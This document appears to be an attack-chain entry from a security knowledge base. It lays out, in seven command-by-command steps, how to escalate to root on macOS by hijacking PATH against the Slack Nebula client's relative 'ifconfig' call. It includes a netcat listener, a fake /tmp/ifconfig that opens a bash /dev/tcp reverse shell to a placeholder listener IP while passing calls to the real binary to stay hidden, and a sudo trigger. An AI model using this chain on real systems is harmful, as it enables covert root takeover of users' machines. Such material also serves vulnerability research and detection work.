---
id: ac-uuid-001
tags:
  - command-injection
  - path-hijacking
  - rce
  - privilege-escalation
  - nebula
  - slack
type: attack_chain
tools:
  - '[[tools/nc]]'
tactics:
  - '[[Privilege Escalation]]'
  - '[[Execution]]'
verified: false
platforms:
  - macOS
  - Windows
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-Nebula-PATH-Hijacking-for-RCE]]'
step_count: 7
techniques:
  - '[[Path Interception by PATH Environment Variable]]'
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:29:09.874Z'
description: >-
  Multi-stage privilege escalation exploiting relative paths in Slack Nebula
  client's exec.Command calls, enabling PATH manipulation to inject malicious
  scripts and achieve root RCE on macOS.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Path Interception by PATH Environment Variable]]'
  - '[[Unix Shell]]'
---
# Nebula Client PATH Hijacking for Root RCE via Relative Exec Calls

Multi-stage attack chain demonstrating exploitation of relative paths in Slack's Nebula client for arbitrary command execution as root on macOS, leading to privilege escalation and persistence.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 7 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup Listener] --> B[Verify Target] --> C[Create Malicious Script] --> D[Make Executable] --> E[Hijack PATH] --> F[Run Nebula] --> G[Receive Shell]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#f39c12
    style E fill:#3498db
    style F fill:#3498db
    style G fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/nc]]

### Target Environment

- macOS (Darwin) with Nebula client installed
- Access to run commands as a standard user
- Nebula source/config available (e.g., from GitHub)
- Network access to a listener host on port 443

### Initial Access Requirements

- Local user access on target macOS system
- Ability to run Nebula with sudo (common for VPN/tun setup)
- No prior root access needed

## Detailed Attack Procedures

### Step 1: Setup Netcat Listener
procedure: [[procedures/Exploit-Nebula-PATH-Hijacking-for-RCE]]

**Objective**: Establish a listener to receive the incoming reverse shell from the target.

**Instructions**: On an accessible host, start a Netcat listener using [[commands/sudo-nc-listen-443]]:

```bash
sudo nc -nvlp 443
```

**Expected Output**: "Listening on [0.0.0.0] (family 0, port 443)" indicating the listener is active.

**Success Indicators**:
- Listener confirms it's waiting for connections on port 443

### Step 2: Verify Target Identity
procedure: [[procedures/Exploit-Nebula-PATH-Hijacking-for-RCE]]

**Objective**: Confirm the current user and hostname on the target for pre-exploitation baseline.

**Instructions**: On the target macOS system, execute [[commands/whoami]] and [[commands/id]] to check user, followed by [[commands/hostname]]:

```bash
whoami
id
hostname
```

**Expected Output**: Outputs like "admin" for whoami, "uid=501(admin)" for id, and the system's hostname.

**Success Indicators**:
- Non-root user confirmed (e.g., uid != 0)
- Hostname matches expected target

### Step 3: Create Malicious Script
procedure: [[procedures/Exploit-Nebula-PATH-Hijacking-for-RCE]]

**Objective**: Craft a fake 'ifconfig' script in /tmp that spawns a reverse shell while proxying to the real binary.

**Instructions**: Create /tmp/ifconfig with content including a reverse shell via [[commands/bash-reverse-shell]] and call to real ifconfig:

```bash
cat > /tmp/ifconfig << EOF
#!/bin/bash
bash -i >& /dev/tcp/LISTENER_IP_ADDRESS/443 0>&1 &
/sbin/ifconfig \"$1\" \"$2\" \"$3\"
EOF
```
Replace LISTENER_IP_ADDRESS with your listener's IP.

**Expected Output**: File created successfully (verify with ls /tmp/ifconfig).

**Success Indicators**:
- Script file exists in /tmp with reverse shell payload

### Step 4: Make Script Executable
procedure: [[procedures/Exploit-Nebula-PATH-Hijacking-for-RCE]]

**Objective**: Grant execute permissions to the malicious script.

**Instructions**: Run [[commands/chmod-exec-ifconfig]] on the target:

```bash
chmod +x /tmp/ifconfig
```

**Expected Output**: No output; verify with ls -l /tmp/ifconfig showing -rwxr-xr-x.

**Success Indicators**:
- Script is executable

### Step 5: Hijack PATH Environment
procedure: [[procedures/Exploit-Nebula-PATH-Hijacking-for-RCE]]

**Objective**: Prepend /tmp to PATH so Nebula's relative 'ifconfig' call hits the fake script.

**Instructions**: Export the modified PATH using [[commands/export-path-hijack]]:

```bash
export PATH=/tmp:$PATH
```

**Expected Output**: No output; verify with echo $PATH showing /tmp first.

**Success Indicators**:
- PATH prioritizes /tmp

### Step 6: Trigger Nebula Execution
procedure: [[procedures/Exploit-Nebula-PATH-Hijacking-for-RCE]]

**Objective**: Run Nebula with sudo to invoke the vulnerable exec.Command calls.

**Instructions**: Execute Nebula using [[commands/sudo-nebula-run]]:

```bash
sudo ./nebula -config config.yml
```

**Expected Output**: Nebula starts, calls 'ifconfig' relatively (hitting fake script), spawns shell; Nebula may continue normally due to proxy.

**Success Indicators**:
- No immediate errors; reverse connection incoming

### Step 7: Receive and Verify Root Shell
procedure: [[procedures/Exploit-Nebula-PATH-Hijacking-for-RCE]]

**Objective**: Accept the reverse shell and confirm root privileges.

**Instructions**: On the listener, the connection arrives; run [[commands/whoami]], [[commands/id]], and [[commands/hostname]] to verify:

```bash
whoami
id
hostname
```

**Expected Output**: "root" for whoami, "uid=0(root)" for id, matching hostname.

**Success Indicators**:
- Root shell established (uid=0)
- Commands execute as root

## Attack Chain Summary

### Key Achievements

1. PATH manipulation to hijack Nebula's system calls
2. Arbitrary RCE as root via reverse shell
3. Undetected operation via proxying to real binaries

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Path Interception by PATH Environment Variable]] Path Interception by Search Order Hijacking
- [[Unix Shell]] Unix Shell

### MITRE ATT&CK Tactics

- [[Privilege Escalation]] Privilege Escalation
- [[Execution]] Execution

---
*Last updated: 2023-10-01T00:00:00Z*
